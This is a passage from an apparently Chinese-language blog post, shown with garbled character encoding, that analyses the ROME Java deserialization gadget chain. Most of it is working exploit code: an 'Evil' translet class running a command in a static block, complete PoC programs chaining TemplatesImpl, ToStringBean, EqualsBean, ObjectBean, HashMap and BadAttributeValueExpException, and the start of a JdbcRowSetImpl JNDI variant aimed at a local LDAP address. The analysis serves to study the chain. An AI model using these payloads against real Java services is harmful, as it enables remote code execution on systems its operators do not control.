ï¼‰</li></ul><p>ä¸‹é¢ä»¥<code>TemplatesImpl#getOutputProperties</code>ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(TemplatesImpl.class, obj);<br>    System.out.println(bean);  <span class="hljs-comment">// è°ƒç”¨ToStringBeançš„toStringæ–¹æ³•</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€è¦æ‰¾æŸä¸ªç±»çš„<code>readObject</code>è°ƒç”¨äº†<code>toString</code>ä¸”è°ƒç”¨è€…å¯æ§ã€‚</p><p>è¿™é‡Œæ‰¾äº†ä¸ªä¸­é—´äºº<code>EqualsBean</code>ï¼Œå’Œ<code>ToStringBean</code>åœ¨åŒä¸€ä¸ªåŒ…ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// The hashcode is calculated by getting the hashcode of the Bean String representation</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EqualsBean</span><span class="hljs-params">(Class beanClass,Object obj)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!beanClass.isInstance(obj)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(obj.getClass()+<span class="hljs-string">&quot; is not instance of &quot;</span> + beanClass);<br>        &#125;<br>        _beanClass = beanClass;<br>        _obj = obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> beanHashCode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">beanHashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _obj.toString().hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„<code>hashCode</code>ï¼Œå…¥å£å°±æ˜¯<code>URLDNS</code>çš„å…¥å£ç±»<code>hashMap</code></p><p><code>hashMap#readObject</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code> &#x3D;&gt; <code>EqualsBean#hashCode</code></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>å’Œ<code>URLDNS</code>ä¸€æ ·ï¼Œå¾€<code>map</code>é‡Œ<code>put</code>æ—¶ä¼šè§¦å‘<code>hashCode</code>ï¼Œè¿™é‡Œä½¿ç”¨<code>ObjectBean</code>æ¥ä½œä¸­è½¬ï¼Œåé¢å†ç”¨åå°„ä¿®æ”¹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectBean</span><span class="hljs-params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;<br>        _equalsBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(beanClass,obj);<br>        _toStringBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(beanClass,obj);<br>        _cloneableBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CloneableBean</span>(obj,ignoreProperties);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _equalsBean.beanHashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, bean);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">fakeBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;p4d0rn&quot;</span>);  <span class="hljs-comment">// ä¼ å…¥æ— å®³çš„String.class</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(fakeBean, <span class="hljs-number">1</span>);  <span class="hljs-comment">// æ³¨æ„putçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡Œhash</span><br>        setFieldValue(fakeBean, <span class="hljs-string">&quot;_equalsBean&quot;</span>, equalsBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(map);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ã€‚</p><p>æ„é€ <code>ToStringBean</code>æ—¶åº”è¯¥ä¼ å…¥<code>Templates.class</code>ï¼Œè¿™ä¸ª<code>Templates</code>æ¥å£åªå®šä¹‰äº†<code>getOutputProperties</code>è¿™ä¸ªæ–¹æ³•ã€‚</p><p>è‹¥ä¼ å…¥<code>TemplatesImpl.class</code>ï¼Œ<code>BeanIntrospector.getPropertyDescriptors(Target.class)</code>éå†getteræ–¹æ³•æ—¶ï¼Œä¼šå…ˆéå†åˆ°<code>getStylesheetDOM</code>ï¼Œ<code>return (DOM)_sdom.get();</code>ã€‚</p><p>è€Œ<code>_sdom</code>è¿™ä¸ªå±æ€§è¢«<code>transient</code>ä¿®é¥°ï¼Œæ— æ³•è¢«åºåˆ—åŒ–ã€‚ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ›å‡º<code>NullPoint</code>å¼‚å¸¸ï¼Œé€€å‡º<code>getter</code>æ–¹æ³•éå†ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œåˆ°<code>getOutputProperties</code></p></blockquote><p>CC5ä¸­ä¹Ÿæœ‰åˆ©ç”¨åˆ°<code>toString()</code>çš„ç±»ï¼Œ<code>BadAttributeValueExpException</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>        <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/Rome/image-20240810223842547.png" alt="image-20240810223842547"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(bean);<br>        <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fastjsoné‚£èŠ‚åˆ©ç”¨çš„æ˜¯<code>JdbcRowSetImpl#setAutoCommit</code>æ¥è¿›è¡Œjndiæ³¨å…¥ï¼Œä½†ROMEé“¾æ˜¯è§¦å‘getteræ–¹æ³•ã€‚</p><p>å®é™…ä¸Šåœ¨<code>JdbcRowSetImpl</code>ç±»é‡Œæœç´¢<code>this.connect()</code>ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªæ–¹æ³•<code>getDatabaseMetaData</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connect();<br>    <span class="hljs-keyword">return</span> var1.getMetaData();<br>&#125;<br><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getDataSourceName() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>                <span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br>            &#125;<br>            <span class="hljs-comment">// ....</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getDataSourceName</code>æ˜¯åœ¨<code>JdbcRowSetImpl</code>çˆ¶ç±»<code>BaseRowSet</code>ä¸­å®šä¹‰çš„ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ç”¨<code>getDeclaredField</code>æ¥è·å–äº†ã€‚</p><p><code>JdbcRowSetImpl#setDataSourceName</code>å¯ä»¥ç›´æ¥è®¾ç½®å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span 